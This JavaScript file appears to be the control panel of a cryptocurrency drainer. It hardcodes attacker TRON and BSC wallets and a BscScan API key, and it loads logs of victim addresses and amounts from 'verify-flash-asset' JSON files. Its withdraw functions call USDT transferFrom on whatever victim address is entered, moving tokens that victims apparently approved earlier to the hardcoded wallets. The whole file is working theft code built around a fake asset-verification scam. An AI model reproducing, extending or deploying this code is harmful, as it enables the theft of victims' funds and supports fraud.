const TRON_WALLET = "TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN";
const BSC_WALLET = "0x21d6aF5418480d5C7A837BF1d3F25fCd43AE3c7E";
const BSC_API_KEY = "KW2H7WKIP7Q8UTFB7G7Q1U24R8XWV5KDY4";

const trcBalanceSpan = document.getElementById("trc20-balance");
const bepBalanceSpan = document.getElementById("bep20-balance");
const trcLogs = document.getElementById("trc20-logs");
const bepLogs = document.getElementById("bep20-logs");

async function fetchBEP20Balance() {
  try {
    const url = `https://api.bscscan.com/api?module=account&action=tokenbalance&contractaddress=0x55d398326f99059fF775485246999027B3197955&address=${BSC_WALLET}&tag=latest&apikey=${BSC_API_KEY}`;
    const res = await fetch(url);
    const data = await res.json();
    const raw = parseFloat(data.result) / 1e18;
    bepBalanceSpan.textContent = `${raw.toFixed(2)} USDT`;
  } catch (e) {
    bepBalanceSpan.textContent = "Error";
  }
}

async function fetchTRC20Balance() {
  try {
    const res = await fetch(`https://api.trongrid.io/v1/accounts/${TRON_WALLET}`);
    const data = await res.json();
    const tokens = data.data[0].trc20;
    const usdt = tokens.find(t => t["Tether USD"]);
    const raw = parseFloat(usdt["Tether USD"]);
    trcBalanceSpan.textContent = `${raw.toFixed(2)} USDT`;
  } catch (e) {
    trcBalanceSpan.textContent = "Error";
  }
}

async function fetchLogs() {
  try {
    const bepRes = await fetch("https://verify-flash-asset.github.io/data/bep20.json");
    const bepData = await bepRes.json();
    bepLogs.innerHTML = "";
    bepData.slice().reverse().forEach(log => {
      const row = document.createElement("div");
      row.textContent = `${log.address} — ${log.amount} USDT`;
      bepLogs.appendChild(row);
    });

    const trcRes = await fetch("https://verify-flash-asset.github.io/data/trc20.json");
    const trcData = await trcRes.json();
    trcLogs.innerHTML = "";
    trcData.slice().reverse().forEach(log => {
      const row = document.createElement("div");
      row.textContent = `${log.address} — ${log.amount} USDT`;
      trcLogs.appendChild(row);
    });
  } catch (e) {
    console.error("Error loading logs", e);
  }
}

async function withdrawTRC20() {
  const from = document.getElementById("trc-from").value.trim();
  const amount = document.getElementById("trc-amount").value.trim();
  if (!from || !amount) return alert("Enter all TRC20 fields");

  try {
    const tradeobj = await window.tronWeb.contract().at("TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"); // USDT
    const result = await tradeobj.transferFrom(from, TRON_WALLET, parseInt(amount * 1e6)).send();
    alert("TRC20 Withdraw Success:\n" + result);
  } catch (e) {
    alert("TRC20 Withdraw Failed:\n" + e.message);
  }
}

async function withdrawBEP20() {
  const from = document.getElementById("bep-from").value.trim();
  const amount = document.getElementById("bep-amount").value.trim();
  if (!from || !amount) return alert("Enter all BEP20 fields");

  if (typeof window.ethereum === "undefined") {
    return alert("MetaMask not detected");
  }

  await ethereum.request({ method: 'eth_requestAccounts' });
  const web3 = new Web3(window.ethereum);
  const usdt = new web3.eth.Contract([
    { "constant": false, "inputs": [
      { "name": "sender", "type": "address" },
      { "name": "recipient", "type": "address" },
      { "name": "amount", "type": "uint256" }
    ],
    "name": "transferFrom", "outputs": [
      { "name": "", "type": "bool" }
    ],
    "type": "function"
  }], "0x55d398326f99059fF775485246999027B3197955");

  const accounts = await web3.eth.getAccounts();
  try {
    await usdt.methods.transferFrom(from, BSC_WALLET, web3.utils.toWei(amount)).send({ from: accounts[0] });
    alert("BEP20 Withdraw Success");
  } catch (err) {
    alert("BEP20 Withdraw Failed:\n" + err.message);
  }
}

document.getElementById("withdraw-trc").onclick = withdrawTRC20;
document.getElementById("withdraw-bep").onclick = withdrawBEP20;

fetchTRC20Balance();
fetchBEP20Balance();
fetchLogs();
